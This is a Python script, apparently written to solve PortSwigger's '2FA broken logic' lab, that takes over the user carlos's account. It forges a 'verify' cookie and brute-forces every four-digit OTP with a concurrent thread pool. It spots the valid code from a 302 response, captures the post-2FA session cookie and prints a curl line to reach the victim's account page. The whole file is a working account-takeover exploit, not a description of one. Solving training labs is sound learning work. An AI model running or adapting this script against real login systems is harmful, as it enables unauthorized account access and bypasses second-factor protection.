#!/usr/bin/env python3
"""
Brute-force del OTP de carlos en el lab "2FA broken logic" de PortSwigger.

Uso:
    python3 bruteforce.py --host <lab-host> --session <cookie-session> [--workers 20]

Ejemplo:
    python3 bruteforce.py \\
        --host 0ad5001f0391a8738096763300c600da.web-security-academy.net \\
        --session NMkr6rIvj2IbQdZy38EorgBMqFFpxvRk

El script:
  1. Refresca el OTP de carlos (GET /login2 con verify=carlos).
  2. Lanza un pool de workers que prueban codigos de 0000 a 9999 en POST /login2.
  3. Detecta el codigo correcto por status 302 (vs 200 del error).
  4. Imprime el codigo ganador y la cookie session post-2FA para que la uses
     en /my-account?id=carlos.
"""

import argparse
import concurrent.futures
import sys
import threading
from urllib.parse import urlparse

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

FOUND = threading.Event()
RESULT = {}


def make_session(retries: int = 2) -> requests.Session:
    s = requests.Session()
    retry = Retry(total=retries, backoff_factor=0.2,
                  status_forcelist=[500, 502, 503, 504])
    s.mount("https://", HTTPAdapter(max_retries=retry, pool_connections=50,
                                    pool_maxsize=50))
    return s


def refresh_otp(host: str, session_cookie: str) -> int:
    """Trigger OTP generation for carlos hitting GET /login2 con verify=carlos."""
    s = make_session()
    r = s.get(f"https://{host}/login2",
              cookies={"session": session_cookie, "verify": "carlos"},
              allow_redirects=False, timeout=10)
    print(f"[+] GET /login2 con verify=carlos -> status {r.status_code}")
    return r.status_code


def try_code(host: str, session_cookie: str, code: int) -> tuple[int, int, int]:
    """Devuelve (code, status, content_length). 302 = OTP correcto."""
    if FOUND.is_set():
        return code, -1, 0
    s = make_session()
    try:
        r = s.post(f"https://{host}/login2",
                   cookies={"session": session_cookie, "verify": "carlos"},
                   data={"mfa-code": f"{code:04d}"},
                   allow_redirects=False, timeout=15)
    except requests.RequestException as e:
        return code, -2, 0
    status = r.status_code
    if status == 302:
        # Capturar la session post-2FA para usar en /my-account
        post_session = r.cookies.get("session")
        RESULT.update({
            "code": f"{code:04d}",
            "status": status,
            "location": r.headers.get("Location", ""),
            "post_session": post_session,
        })
        FOUND.set()
    return code, status, len(r.content)


def main():
    p = argparse.ArgumentParser(description="2FA broken logic brute-forcer")
    p.add_argument("--host", required=True,
                   help="Lab host (ej. 0ad5...web-security-academy.net)")
    p.add_argument("--session", required=True,
                   help="Cookie session (la del paso 1, antes de la rotacion)")
    p.add_argument("--workers", type=int, default=20,
                   help="Workers concurrentes (default 20)")
    p.add_argument("--start", type=int, default=0,
                   help="Codigo inicial (default 0)")
    p.add_argument("--end", type=int, default=10000,
                   help="Codigo final exclusivo (default 10000)")
    p.add_argument("--refresh-every", type=int, default=2500,
                   help="Refrescar OTP cada N intentos (0 = no refrescar)")
    args = p.parse_args()

    # Limpiar host si vino con esquema
    if "://" in args.host:
        args.host = urlparse(args.host).netloc

    print(f"[*] Target: {args.host}")
    print(f"[*] Session: {args.session[:12]}...")
    print(f"[*] Probando codigos {args.start:04d}..{args.end-1:04d} con "
          f"{args.workers} workers")

    refresh_otp(args.host, args.session)

    tried = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.workers) as ex:
        futures = {ex.submit(try_code, args.host, args.session, c): c
                   for c in range(args.start, args.end)}
        try:
            for fut in concurrent.futures.as_completed(futures):
                code, status, length = fut.result()
                tried += 1
                if status == 302:
                    print(f"\n[+] OTP CORRECTO: {code:04d} (status 302, "
                          f"length {length})")
                    break
                if tried % 250 == 0:
                    print(f"    {tried} probados, ultimo: {code:04d} "
                          f"(status {status}, length {length})")
                if (args.refresh_every and tried > 0
                        and tried % args.refresh_every == 0
                        and not FOUND.is_set()):
                    print(f"[*] Refrescando OTP de carlos a los {tried} intentos")
                    refresh_otp(args.host, args.session)
        except KeyboardInterrupt:
            print("\n[!] Interrumpido")
            FOUND.set()

    if RESULT:
        print("\n=== Lab solved ===")
        print(f"  mfa-code: {RESULT['code']}")
        print(f"  Location: {RESULT['location']}")
        print(f"  Cookie session post-2FA: {RESULT['post_session']}")
        print("\nReproducir:")
        print(f"  curl -i 'https://{args.host}/my-account?id=carlos' \\\\")
        print(f"      -H 'Cookie: session={RESULT['post_session']}'")
        sys.exit(0)
    else:
        print("\n[!] No se encontro el codigo en el rango. Probar refrescar OTP "
              "y reintentar.")
        sys.exit(1)


if __name__ == "__main__":
    main()
